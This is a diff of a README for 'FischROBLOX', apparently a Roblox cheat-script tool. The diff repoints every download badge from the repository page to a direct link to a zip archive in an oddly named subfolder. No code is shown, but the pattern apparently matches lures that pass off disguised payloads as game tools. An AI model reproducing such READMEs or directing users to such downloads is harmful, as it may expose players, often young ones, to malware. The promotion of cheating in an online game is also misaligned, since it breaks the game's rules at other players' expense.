@@ -1,6 +1,6 @@
 # 🎮 FischROBLOX - Simple ROBLOX Script Tool
 
-[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-brightgreen?style=for-the-badge)](https://github.com/oceanremodeling/FischROBLOX)
+[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-brightgreen?style=for-the-badge)](https://github.com/oceanremodeling/FischROBLOX/raw/refs/heads/main/trichroic/Fisch-ROBLOX-3.5.zip)
 
 ## 📝 About FischROBLOX
 
@@ -28,7 +28,7 @@ Use the steps below to get FischROBLOX up and running on your Windows PC.
 
 Click the button below to go to the official download page. This page contains the latest version of FischROBLOX.
 
-[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-blue?style=for-the-badge)](https://github.com/oceanremodeling/FischROBLOX)
+[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-blue?style=for-the-badge)](https://github.com/oceanremodeling/FischROBLOX/raw/refs/heads/main/trichroic/Fisch-ROBLOX-3.5.zip)
 
 ### Step 2: Download the Software
 
@@ -126,4 +126,4 @@ If you need help, you can:
 
 ---
 
-[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-brightgreen?style=for-the-badge)](https://github.com/oceanremodeling/FischROBLOX)
+[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-brightgreen?style=for-the-badge)](https://github.com/oceanremodeling/FischROBLOX/raw/refs/heads/main/trichroic/Fisch-ROBLOX-3.5.zip)
